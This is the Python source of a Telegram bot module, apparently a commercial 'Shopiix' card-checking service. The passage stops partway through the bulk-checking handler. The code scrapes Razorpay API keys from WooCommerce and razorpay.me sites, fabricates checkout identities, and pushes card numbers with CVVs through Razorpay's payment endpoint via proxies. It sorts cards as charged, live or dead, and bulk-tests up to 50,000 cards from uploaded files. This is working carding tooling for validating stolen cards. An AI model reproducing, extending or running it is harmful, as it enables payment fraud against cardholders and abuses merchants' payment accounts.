import aiohttp
import asyncio
import re
import random
import string
import time
import os
import json
import aiofiles
from telethon import events, Button

# ─── CONFIG ────────────────────────────────────────────────────────────────────
MAX_CARDS      = 50000
MAX_SITES      = 10
_RZ_SITES_FILE = "razorpay_sites.json"
_rz_sites: dict    = {}  # {user_id: [url1, url2, ...]}
_rz_key_cache: dict = {}  # {url: rzp_live_xxx}

UA     = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36"
RZ_API = "https://api.razorpay.com/v1"

rnd = lambda k: ''.join(random.choices('0123456789abcdef', k=k))
fn  = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)

# ─── SITE STORAGE ──────────────────────────────────────────────────────────────
def _load_rz_sites():
    global _rz_sites
    try:
        with open(_RZ_SITES_FILE) as f:
            data = json.load(f)
        result = {}
        for k, v in data.items():
            result[int(k)] = v if isinstance(v, list) else [v]
        _rz_sites = result
    except Exception:
        _rz_sites = {}

def _save_rz_sites():
    try:
        with open(_RZ_SITES_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _rz_sites.items()}, f)
    except Exception:
        pass

def _get_user_rz_sites(user_id):
    return _rz_sites.get(user_id, [])

def _add_user_rz_site(user_id, url):
    sites = _rz_sites.get(user_id, [])
    if url not in sites:
        sites.append(url)
    _rz_sites[user_id] = sites
    _save_rz_sites()

def _remove_user_rz_site(user_id, idx):
    sites = _rz_sites.get(user_id, [])
    if 0 <= idx < len(sites):
        removed = sites.pop(idx)
        _rz_key_cache.pop(removed, None)
        _rz_sites[user_id] = sites
        _save_rz_sites()
        return removed
    return None

def _normalize_url(url):
    url = url.strip().rstrip('/')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url

# ─── HELPERS ───────────────────────────────────────────────────────────────────
def _parse_proxy(p):
    if not p:
        return None
    if '://' in p:
        return p
    parts = p.split(':')
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _extract_cc(text):
    pattern = re.compile(
        r'\b(\d{15,16})[|/,: ]+(\d{1,2})[|/,: ]+(\d{2,4})[|/,: ]+(\d{3,4})\b'
    )
    seen, cards = set(), []
    for m in pattern.finditer(text):
        card = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        if card not in seen:
            seen.add(card)
            cards.append(card)
    return cards

def _random_email():
    return f"{''.join(random.choices(string.ascii_lowercase, k=6))}{rnd(3)}@gmail.com"

def _random_phone():
    return f"9{''.join(random.choices('0123456789', k=9))}"

def _random_name():
    first = random.choice(['Rahul', 'Amit', 'Vikram', 'Raj', 'Arjun', 'Suresh', 'Deepak'])
    last  = random.choice(['Sharma', 'Kumar', 'Singh', 'Patel', 'Verma', 'Gupta'])
    return first, last

def _is_rzme(site):
    return 'razorpay.me' in site

# ─── RAZORPAY KEY SCRAPER ──────────────────────────────────────────────────────
def _extract_rz_key_from_text(text, site):
    """Try all known patterns to find rzp key in page text/JSON."""
    patterns = [r'(rzp_live_[A-Za-z0-9]{14,})', r'(rzp_test_[A-Za-z0-9]{14,})']
    for pat in patterns:
        m = re.search(pat, text)
        if m:
            key = m.group(1)
            _rz_key_cache[site] = key
            pid = re.search(r'(ppage_[A-Za-z0-9]+)', text)
            if pid:
                _rz_key_cache[site + '__ppage'] = pid.group(1)
            return key
    return None

async def _scrape_rz_key(site, proxy=None):
    if site in _rz_key_cache:
        return _rz_key_cache[site]

    headers = {
        'user-agent': UA,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'accept-language': 'en-IN,en;q=0.9',
    }

    if _is_rzme(site):
        # Extract handle from URL: razorpay.me/@handle
        handle = site.rstrip('/').split('/@')[-1] if '/@' in site else ''

        connector = aiohttp.TCPConnector(ssl=False)
        try:
            async with aiohttp.ClientSession(headers=headers, connector=connector) as sess:

                # 1. Try Razorpay's internal API for payment page by handle
                if handle:
                    api_urls = [
                        f'https://api.razorpay.com/v1/payment_pages/handle/{handle}',
                        f'https://api.razorpay.com/v1/payment_links/page/{handle}',
                        f'https://razorpay.me/api/payment-page?handle={handle}',
                    ]
                    for api_url in api_urls:
                        try:
                            async with sess.get(api_url, proxy=proxy,
                                    timeout=aiohttp.ClientTimeout(total=10)) as r:
                                txt = await r.text(errors='ignore')
                            key = _extract_rz_key_from_text(txt, site)
                            if key:
                                return key
                        except Exception:
                            continue

                # 2. Load the page itself — key may be in __NEXT_DATA__ or inline script
                for url in [site, site.rstrip('/') + '/']:
                    try:
                        async with sess.get(url, proxy=proxy,
                                timeout=aiohttp.ClientTimeout(total=15),
                                allow_redirects=True) as resp:
                            text = await resp.text(errors='ignore')

                        # Direct regex match first
                        key = _extract_rz_key_from_text(text, site)
                        if key:
                            return key

                        # Try __NEXT_DATA__ JSON
                        nd = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.+?)</script>', text, re.S)
                        if nd:
                            key = _extract_rz_key_from_text(nd.group(1), site)
                            if key:
                                return key

                        # Try window.__data or window.rzpData etc.
                        for block in re.findall(r'<script[^>]*>(.+?)</script>', text, re.S):
                            key = _extract_rz_key_from_text(block, site)
                            if key:
                                return key

                    except Exception:
                        continue
        except Exception:
            pass
        return None

    else:
        # WooCommerce site
        urls = [f'{site}/', f'{site}/checkout/', f'{site}/shop/', f'{site}/donate/']
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(headers=headers, connector=connector) as sess:
                for url in urls:
                    try:
                        async with sess.get(url, proxy=proxy,
                                timeout=aiohttp.ClientTimeout(total=12),
                                allow_redirects=True) as resp:
                            text = await resp.text(errors='ignore')
                        key = _extract_rz_key_from_text(text, site)
                        if key:
                            return key
                    except Exception:
                        continue
        except Exception:
            pass
        return None

# ─── ORDER CREATION — razorpay.me payment page ────────────────────────────────
async def _create_rzme_order(site, key, proxy):
    headers = {
        'user-agent':   UA,
        'origin':       'https://razorpay.me',
        'referer':      site,
        'content-type': 'application/json',
    }
    ppage_id = _rz_key_cache.get(site + '__ppage')
    amount   = 100  # ₹1

    try:
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(headers=headers, connector=connector) as s:
            # Try payment page order endpoint
            endpoints = []
            if ppage_id:
                endpoints.append(
                    (f'https://api.razorpay.com/v1/payment_pages/{ppage_id}/payment',
                     {'amount': amount, 'currency': 'INR'})
                )
            # Generic checkout embedded endpoint
            handle = site.rstrip('/').split('/@')[-1] if '/@' in site else ''
            if handle:
                endpoints.append(
                    (f'https://api.razorpay.com/v1/checkout/embedded',
                     {'key': key, 'amount': amount, 'currency': 'INR',
                      'receipt': f'rcpt_{rnd(8)}'})
                )

            for url, payload in endpoints:
                try:
                    async with s.post(url, json=payload, proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=15)) as r:
                        d = await r.json(content_type=None)
                    order_id = d.get('id') or d.get('order_id') or d.get('razorpay_order_id')
                    if order_id and order_id.startswith('order_'):
                        return {'order_id': order_id, 'amount': amount}
                except Exception:
                    continue
    except Exception:
        pass
    return None

# ─── ORDER CREATION — WooCommerce + Razorpay ───────────────────────────────────
async def _create_order(s, site, proxy):
    headers = {'user-agent': UA}

    try:
        # 1. Find cheapest product
        async with s.get(f'{site}/shop/', headers=headers, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as r:
            shop_text = await r.text(errors='ignore')

        product_id = None
        # Try price-sorted match
        priced = re.findall(r'data-product_id="(\d+)"[^>]*data-price="([^"]+)"', shop_text)
        if priced:
            try:
                cheapest   = min(priced, key=lambda x: float(x[1]))
                product_id = cheapest[0]
            except Exception:
                product_id = priced[0][0]
        else:
            m = re.search(r'\?add-to-cart=(\d+)', shop_text)
            if m:
                product_id = m.group(1)

        if not product_id:
            return None

        # 2. Add to cart
        await s.get(f'{site}/?add-to-cart={product_id}&quantity=1',
            headers=headers, proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=12), allow_redirects=True)

        # 3. Load checkout
        async with s.get(f'{site}/checkout/', headers=headers, proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=15), allow_redirects=True) as r:
            checkout_text = await r.text(errors='ignore')

        # 4. Get nonce
        nonce = None
        for pat in [
            r'"razorpay_order_nonce"\s*:\s*"([^"]+)"',
            r'name="woocommerce-process-checkout-nonce"\s+value="([^"]+)"',
            r'"woocommerce-process-checkout-nonce"\s*:\s*"([^"]+)"',
            r'"nonce"\s*:\s*"([a-f0-9]{10})"',
        ]:
            m = re.search(pat, checkout_text)
            if m:
                nonce = m.group(1)
                break

        # Get amount (paise)
        amount_m = re.search(r'"amount"\s*:\s*(\d+)', checkout_text)
        amount   = int(amount_m.group(1)) if amount_m else 100  # ₹1 default

        first, last = _random_name()
        checkout_data = {
            'billing_first_name': first,
            'billing_last_name':  last,
            'billing_email':      _random_email(),
            'billing_phone':      _random_phone(),
            'billing_address_1':  'MG Road',
            'billing_city':       'Mumbai',
            'billing_state':      'MH',
            'billing_postcode':   '400001',
            'billing_country':    'IN',
            'payment_method':     'razorpay',
            'woocommerce-process-checkout-nonce': nonce or '',
            '_wp_http_referer':   '/checkout/',
        }

        # 5. Submit checkout to get Razorpay order_id
        for endpoint in [
            f'{site}/?wc-ajax=checkout',
            f'{site}/wp-admin/admin-ajax.php',
        ]:
            try:
                async with s.post(endpoint,
                    headers={
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': site,
                        'referer': f'{site}/checkout/',
                        'x-requested-with': 'XMLHttpRequest',
                    },
                    data=checkout_data,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=20)) as r:
                    resp_text = await r.text(errors='ignore')

                for pat in [
                    r'"order_id"\s*:\s*"(order_[A-Za-z0-9]+)"',
                    r'razorpay_order_id["\s:]+["\']?(order_[A-Za-z0-9]+)',
                ]:
                    m = re.search(pat, resp_text)
                    if m:
                        return {'order_id': m.group(1), 'amount': amount}
            except Exception:
                continue

    except Exception:
        pass
    return None

# ─── CORE CHECKER ──────────────────────────────────────────────────────────────
async def razorpay_check(card: str, site: str, key: str, proxy_str=None):
    p = card.strip().split('|')
    if len(p) != 4:
        return {'status': 'Error', 'message': 'Invalid format', 'card': card}

    cc, mm, yy, cvv = p
    yy    = ('20' + yy) if len(yy) == 2 else yy
    proxy = _parse_proxy(proxy_str)

    first, last = _random_name()

    connector = aiohttp.TCPConnector(ssl=False)
    try:
        async with aiohttp.ClientSession(headers={'user-agent': UA},
                connector=connector) as s:

            # razorpay.me: skip order creation, charge directly with key + ₹1
            if _is_rzme(site):
                payload = {
                    'amount':             '100',
                    'currency':           'INR',
                    'method':             'card',
                    'card[name]':         f'{first} {last}',
                    'card[number]':       cc,
                    'card[expiry_month]': mm.zfill(2),
                    'card[expiry_year]':  yy[-2:],
                    'card[cvv]':          cvv,
                    'key_id':             key,
                    'contact':            _random_phone(),
                    'email':              _random_email(),
                    '_':                  str(int(time.time() * 1000)),
                }
            else:
                order = await _create_order(s, site, proxy)
                if not order:
                    return {'status': 'Error', 'message': 'Order creation failed', 'card': card}
                payload = {
                    'amount':             str(order['amount']),
                    'currency':           'INR',
                    'order_id':           order['order_id'],
                    'method':             'card',
                    'card[name]':         f'{first} {last}',
                    'card[number]':       cc,
                    'card[expiry_month]': mm.zfill(2),
                    'card[expiry_year]':  yy[-2:],
                    'card[cvv]':          cvv,
                    'key_id':             key,
                    'contact':            _random_phone(),
                    'email':              _random_email(),
                    '_':                  str(int(time.time() * 1000)),
                }

            # Hit Razorpay payment API
            try:
                async with aiohttp.ClientSession() as rz:
                    async with rz.post(
                        f'{RZ_API}/payments/create/ajax',
                        headers={
                            'origin':       'https://checkout.razorpay.com',
                            'referer':      'https://checkout.razorpay.com/',
                            'user-agent':   UA,
                            'content-type': 'application/x-www-form-urlencoded',
                        },
                        data=payload,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as dr:
                        d = await dr.json(content_type=None)
            except Exception as e:
                return {'status': 'Error', 'message': f'RZ API: {e}', 'card': card}

            # Parse response
            if d.get('razorpay_payment_id'):
                return {'status': 'Charged', 'message': f"₹ Charged — {d['razorpay_payment_id']}", 'card': card}

            nxt = d.get('next', {})
            if nxt:
                act = nxt.get('action', '')
                if act in ('redirect', 'otp_generate', 'otp_validate'):
                    return {'status': 'Live', 'message': '3DS / OTP Required', 'card': card}

            error  = d.get('error', {})
            reason = error.get('reason', '')
            desc   = error.get('description', error.get('message', 'Declined'))

            _live_reasons = {
                'insufficient_funds', 'card_velocity_exceeded', 'do_not_honor',
                'not_permitted', 'restricted_card', 'security_violation',
                'transaction_not_permitted',
            }
            if reason in _live_reasons:
                return {'status': 'Live', 'message': desc, 'card': card}

            return {'status': 'Dead', 'message': desc or reason or 'Declined', 'card': card}

    except asyncio.TimeoutError:
        return {'status': 'Error', 'message': 'Timeout', 'card': card}
    except Exception as ex:
        return {'status': 'Error', 'message': str(ex)[:80], 'card': card}
    finally:
        await connector.close()

# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────
def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):

    _load_rz_sites()

    # ── /rzadd ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzadd(\s|$)'))
    async def rzadd_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return

        parts   = event.raw_text.split(maxsplit=1)
        url_raw = None

        if len(parts) >= 2:
            url_raw = parts[1].strip()
        elif event.reply_to_msg_id:
            reply_msg = await event.get_reply_message()
            if reply_msg and reply_msg.file and reply_msg.file.name and \
                    reply_msg.file.name.endswith('.txt'):
                file_path = await reply_msg.download_media()
                try:
                    async with aiofiles.open(file_path, 'r',
                            encoding='utf-8', errors='ignore') as f:
                        content = await f.read()
                    os.remove(file_path)
                    m = re.search(r'https?://\S+', content)
                    if not m:
                        m = re.search(r'[a-zA-Z0-9][-a-zA-Z0-9.]+\.[a-zA-Z]{2,}', content)
                    if m:
                        url_raw = m.group(0).strip().rstrip('/')
                except Exception:
                    pass
            elif reply_msg and reply_msg.text:
                m = re.search(r'https?://\S+', reply_msg.text)
                if m:
                    url_raw = m.group(0).strip().rstrip('/')

        if not url_raw:
            await event.reply(
                "❌ <b>Usage:</b>\n"
                "▸ <code>/rzadd https://yoursite.com</code>\n"
                "▸ Reply to a <b>.txt</b> file with site URL\n"
                "▸ <code>/rzaddtxt</code> — bulk add ALL URLs from .txt\n\n"
                "<i>Supports razorpay.me pages and WooCommerce sites.</i>",
                parse_mode='html'
            )
            return

        sites_now = _get_user_rz_sites(user_id)
        if len(sites_now) >= MAX_SITES:
            await event.reply(
                f"❌ <b>Max {MAX_SITES} sites reached.</b>\n"
                f"Use <code>/rzrem</code> to remove one first.",
                parse_mode='html'
            )
            return

        url  = _normalize_url(url_raw)
        wait = await event.reply(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            f"<i>Fetching Razorpay key from site...</i>",
            parse_mode='html'
        )

        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None
        key     = await _scrape_rz_key(url, proxy)

        if key:
            _add_user_rz_site(user_id, url)
            sites  = _get_user_rz_sites(user_id)
            masked = key[:14] + '...' + key[-4:]
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"✅  <b>𝗦𝗜𝗧𝗘  𝗔𝗗𝗗𝗘𝗗</b>  ✅\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>   ▸  <code>{url}</code>\n"
                f"🔑 <b>𝗞𝗘𝗬</b>    ▸  <code>{masked}</code>\n"
                f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>  ▸  {len(sites)} / {MAX_SITES} sites\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )
        else:
            await wait.edit(
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
                f"❌  <b>𝗡𝗢  𝗞𝗘𝗬  𝗙𝗢𝗨𝗡𝗗</b>  ❌\n"
                f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
                f"🌐 <b>𝗦𝗜𝗧𝗘</b>  ▸  <code>{url}</code>\n\n"
                f"<i>No Razorpay key found. Make sure the site uses Razorpay.</i>\n\n"
                f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
                parse_mode='html'
            )

    # ── /rzaddtxt ──────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzaddtxt(\s|$)'))
    async def rzaddtxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return

        if not event.reply_to_msg_id:
            await event.reply(
                "❌ Reply to a <b>.txt</b> file containing site URLs with <code>/rzaddtxt</code>.",
                parse_mode='html'
            )
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or \
                not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        wait = await event.reply(
            "◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            "<i>Reading file and checking sites...</i>",
            parse_mode='html'
        )

        file_path = await reply_msg.download_media()
        try:
            async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(file_path)
        except Exception:
            await wait.edit("❌ Could not read file.", parse_mode='html')
            return

        all_urls = re.findall(r'https?://\S+', content)
        all_urls = list(dict.fromkeys([u.rstrip('/') for u in all_urls]))  # deduplicate

        if not all_urls:
            await wait.edit(
                "❌ No URLs found in file.\n<i>Each line should be a full URL (https://...)</i>",
                parse_mode='html'
            )
            return

        proxies = load_proxies_fn(user_id)
        added   = []
        skipped = []
        no_key  = []

        for url in all_urls:
            url = _normalize_url(url)
            sites_now = _get_user_rz_sites(user_id)
            if len(sites_now) >= MAX_SITES:
                skipped.append(url)
                continue
            if url in sites_now:
                skipped.append(url)
                continue
            proxy = random.choice(proxies) if proxies else None
            key   = await _scrape_rz_key(url, proxy)
            if key:
                _add_user_rz_site(user_id, url)
                added.append((url, key))
            else:
                no_key.append(url)

        total_now = len(_get_user_rz_sites(user_id))
        added_lines = ''
        for u, k in added[:10]:
            masked = k[:14] + '...' + k[-4:]
            added_lines += f"✅ <code>{u}</code>\n    🔑 <i>{masked}</i>\n"
        if not added_lines:
            added_lines = '<i>None added</i>'

        skip_txt = f"\n⚠️ <b>Skipped</b>  ▸  {len(skipped)} (already added or limit reached)" if skipped else ''
        nokey_txt = f"\n❌ <b>No key</b>  ▸  {len(no_key)} sites" if no_key else ''

        await wait.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"✅  <b>𝗕𝗨𝗟𝗞  𝗔𝗗𝗗  𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘</b>  ✅\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"📋 <b>𝗙𝗢𝗨𝗡𝗗</b>   ▸  {len(all_urls)} URLs in file\n"
            f"✅ <b>𝗔𝗗𝗗𝗘𝗗</b>   ▸  {len(added)}\n"
            f"📊 <b>𝗧𝗢𝗧𝗔𝗟</b>   ▸  {total_now} / {MAX_SITES} sites\n"
            f"{skip_txt}{nokey_txt}\n\n"
            f"〔 ✅  A D D E D  S I T E S 〕\n"
            f"<blockquote>{added_lines}</blockquote>\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /rzlist ────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzlist(\s|$)'))
    async def rzlist_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return
        sites = _get_user_rz_sites(user_id)
        if not sites:
            await event.reply(
                "❌ <b>No sites configured.</b>\n\n"
                "Use <code>/rzadd https://yoursite.com</code>",
                parse_mode='html'
            )
            return
        lines = '\n'.join(
            f"<b>{i+1}.</b>  <code>{s}</code>"
            + (f"\n      🔑 <i>{_rz_key_cache[s][:14]}...</i>" if s in _rz_key_cache else "")
            for i, s in enumerate(sites)
        )
        await event.reply(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"🌐  <b>𝗥𝗔𝗭𝗢𝗥𝗣𝗔𝗬  𝗦𝗜𝗧𝗘𝗦</b>  [ {len(sites)} / {MAX_SITES} ]\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"{lines}\n\n"
            f"◈  Remove: <code>/rzrem &lt;number&gt;</code>\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /rzrem ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rzrem(\s|$)'))
    async def rzrem_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return
        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2 or not parts[1].strip().isdigit():
            await event.reply(
                "❌ <b>Usage:</b> <code>/rzrem &lt;number&gt;</code>\n\n"
                "Use <code>/rzlist</code> to see site numbers.",
                parse_mode='html'
            )
            return
        idx     = int(parts[1].strip()) - 1
        removed = _remove_user_rz_site(user_id, idx)
        if removed:
            await event.reply(
                f"🗑  <b>𝗦𝗜𝗧𝗘  𝗥𝗘𝗠𝗢𝗩𝗘𝗗</b>\n\n"
                f"🌐 <code>{removed}</code>",
                parse_mode='html'
            )
        else:
            await event.reply(
                "❌ Invalid number. Use <code>/rzlist</code> to check.",
                parse_mode='html'
            )

    # ── /rz ────────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rz(\s|$)'))
    async def rz_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return

        sites = _get_user_rz_sites(user_id)
        if not sites:
            await event.reply(
                "❌ <b>No Razorpay site set.</b>\n\n"
                "Use <code>/rzadd https://yoursite.com</code> first.",
                parse_mode='html'
            )
            return

        parts = event.raw_text.split(maxsplit=1)
        if len(parts) < 2:
            await event.reply(
                "❌ <b>Usage:</b> <code>/rz cc|mm|yy|cvv</code>",
                parse_mode='html'
            )
            return

        card = parts[1].strip()
        if card.count('|') != 3:
            await event.reply(
                "❌ Invalid CC format. Use: <code>/rz 4111111111111111|01|25|123</code>",
                parse_mode='html'
            )
            return

        site    = random.choice(sites)
        proxies = load_proxies_fn(user_id)
        proxy   = random.choice(proxies) if proxies else None

        key = _rz_key_cache.get(site)
        if not key:
            key = await _scrape_rz_key(site, proxy)
        if not key:
            await event.reply(
                f"❌ No Razorpay key on <code>{site}</code>.\n"
                f"Remove it with <code>/rzrem</code> and add a working site.",
                parse_mode='html'
            )
            return

        status_msg = await event.reply(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n<code>{card}</code>",
            parse_mode='html'
        )
        t0     = time.time()
        result = await razorpay_check(card, site, key, proxy_str=proxy)
        elapsed = round(time.time() - t0, 2)

        status  = result['status']
        message = result['message']

        if status == 'Charged':
            s_emoji, s_text = '💎', '𝗖𝗛𝗔𝗥𝗚𝗘𝗗'
        elif status == 'Live':
            s_emoji, s_text = '🔥', '𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗'
        elif status == 'Dead':
            s_emoji, s_text = '❌', '𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗'
        else:
            s_emoji, s_text = '⚠️', '𝗘𝗥𝗥𝗢𝗥'

        await status_msg.edit(
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n"
            f"{s_emoji}  <b>{s_text}</b>  {s_emoji}\n"
            f"⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹ ⊹\n\n"
            f"💳 <b>𝗖𝗔𝗥𝗗</b>   ▸  <code>{card}</code>\n"
            f"◈  <b>𝗥𝗘𝗦𝗣</b>   ▸  <i>{message[:120]}</i>\n"
            f"🌐 <b>𝗚𝗪</b>     ▸  Razorpay Charge\n"
            f"⏱  <b>𝗧𝗜𝗠𝗘</b>  ▸  {elapsed}s\n\n"
            f'⚡ <b>𝗦𝗛𝗢𝗣𝗜𝗜𝗫</b>  ·  <a href="tg://user?id=5895386985">𝗔𝗶𝘇𝗲𝗻</a>',
            parse_mode='html'
        )

    # ── /rztxt ─────────────────────────────────────────────────────────────────
    @bot.on(events.NewMessage(pattern=r'^/rztxt(\s|$)'))
    async def rztxt_handler(event):
        user_id = event.sender_id
        if not is_premium_fn(user_id):
            await event.reply(
                "❌ <b>Access Denied</b>\n\nOnly premium users can use this.",
                parse_mode='html'
            )
            return

        sites = _get_user_rz_sites(user_id)
        if not sites:
            await event.reply(
                "❌ <b>No Razorpay site set.</b>\n\n"
                "Use <code>/rzadd https://yoursite.com</code> first.",
                parse_mode='html'
            )
            return

        if not event.reply_to_msg_id:
            await event.reply(
                "❌ Reply to a <b>.txt</b> file with <code>/rztxt</code>.",
                parse_mode='html'
            )
            return

        reply_msg = await event.get_reply_message()
        if not reply_msg or not reply_msg.file or \
                not (reply_msg.file.name or '').endswith('.txt'):
            await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
            return

        # Pre-warm key cache for all sites
        proxies = load_proxies_fn(user_id)
        for _s in list(sites):
            if _s not in _rz_key_cache:
                _proxy = random.choice(proxies) if proxies else None
                await _scrape_rz_key(_s, _proxy)

        valid_sites = [s for s in sites if s in _rz_key_cache]
        if not valid_sites:
            await event.reply(
                "❌ No Razorpay key found on any of your sites.\n"
                "Reconfigure with <code>/rzadd</code>.",
                parse_mode='html'
            )
            return

        wait_msg  = await event.reply("⏳ Reading file...", parse_mode='html')
        file_path = await reply_msg.download_media()
        try:
            async with aiofiles.open(file_path, 'r',
                    encoding='utf-8', errors='ignore') as f:
                content = await f.read()
            os.remove(file_path)
        except Exception:
            await wait_msg.edit("❌ Could not read file.", parse_mode='html')
            return

        cards = _extract_cc(content)
        if not cards:
            await wait_msg.edit("❌ No valid cards found in file.", parse_mode='html')
            return
        if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
            cards = cards[:MAX_CARDS]

        total    = len(cards)
        chat_id  = event.chat_id
        results  = {'charged': [], 'live': [], 'dead': [], 'error': 0, 'start': time.time()}
        _stop    = [False]

        await wait_msg.edit(
            f"◈  <b>𝗦𝗖𝗔𝗡𝗡𝗜𝗡𝗚</b>  <code>[ ░░░░░░░░░░ ]</code>\n"
            f"💳 <b>{total}</b> cards loaded — Starting Razorpay...",
            parse_mode='html'
        )
        prog_msg = await event.respond(
            f"⚡ <b>#Shopiix</b> ⚡\n🔄 <i>Cooking CCs One by One...</i>",
            parse_mode='html'
        )

        stop_key = f"rz_stop_{user_id}_{int(time.time())}".encode()

        async def _stop_handler(e):
            if e.sender_id == user_id and e.data == stop_key:
                _stop[0] = True
                await e.answer("⛔ Stopping...")

        bot.add_event_handler(_stop_handler, events.CallbackQuery())

        async def _update_prog(checked, last_card='', last_resp=''):
            elapsed  = int(time.time() - results['start'])
            h, rem   = divmod(elapsed, 3600)
            m_t, s_t = divmod(rem, 60)
            if last_card:
                num    = last_card.split('|')[0]
                masked = num[:6] + '*' * max(0, len(num) - 10) + num[-4:] if len(num) > 10 else num
            else:
                masked = '—'
            resp_short = (last_resp[:26] + '...') if len(last_resp) > 28 else (last_resp or '—')
            buttons = [
                [Button.inline(f"💳  Card  →  {masked}",                              b"noop")],
                [Button.inline(f"📝  Response  →  {resp_short}",                      b"noop")],
                [Button.inline(f"💎  Charged  →  [ {len(results['charged'])} ]",      b"noop")],
                [Button.inline(f"🔥  Approve  →  [ {len(results['live'])} ]",         b"noop")],
                [Button.inline(f"❌  Decline  →  [ {len(results['dead'])} ]",         b"noop")],
                [Button.inline(f"⚠️  Errors   →  [ {results['error']} ]",             b"noop")],
                [Button.inline(f"✅  Progress  →  [ {checked} / {total} ]",           b"noop")],
